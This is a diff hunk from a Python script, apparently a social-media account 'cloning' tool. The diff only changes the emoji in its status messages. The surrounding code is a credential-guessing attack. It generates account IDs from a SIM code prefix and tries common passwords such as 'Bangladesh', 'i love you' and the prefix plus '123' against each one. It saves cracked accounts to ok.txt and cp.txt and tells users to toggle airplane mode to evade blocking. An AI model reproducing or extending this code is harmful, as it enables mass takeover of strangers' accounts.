@@ -308,20 +308,20 @@ def virus():
 		os.system('clear')
 		print(logo)
 		tl = str(len(user))
-		print(' [🔥]  Total ids:\033[1;92m '+tl)
-		print(f' [🔥]  Usaragents : '+str(len(ugen)))
-		print(f' [🔥]\033[1;97m  target sim code :\033[1;92m {kode} ')
-		print(f"\033[1;97m [🔥]  version:\033[1;92m {doamin}")
-		print(' \033[1;97m[🔥]  The process has been started')
-		print(' [🔥]  use airplane mode if ok ids not come ')
+		print(' [💔]  Total ids:\033[1;92m '+tl)
+		print(f' [💔]  Usaragents : '+str(len(ugen)))
+		print(f' [💔]\033[1;97m  target sim code :\033[1;92m {kode} ')
+		print(f"\033[1;97m [💔]  version:\033[1;92m {doamin}")
+		print(' \033[1;97m[💔]  The process has been started')
+		print(' [💔]  use airplane mode if ok ids not come ')
 		print(50*'_')
 		for guru in user:
 			uid = kode+koda+kodb+guru
 			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','Bangladesh','i love you','i hate you','i have you','বাংলাদেশ']
 			yaari.submit(a,uid,pwx,tl)
 	print(50*'_')
-	print(' [🔥] Crack process has been completed')
-	print(' [🔥] Ids saved in ok.txt,cp.txt')
+	print(' [💔] Crack process has been completed')
+	print(' [💔] Ids saved in ok.txt,cp.txt')
 	print(50*'_')
 	exit()
 def virus2():
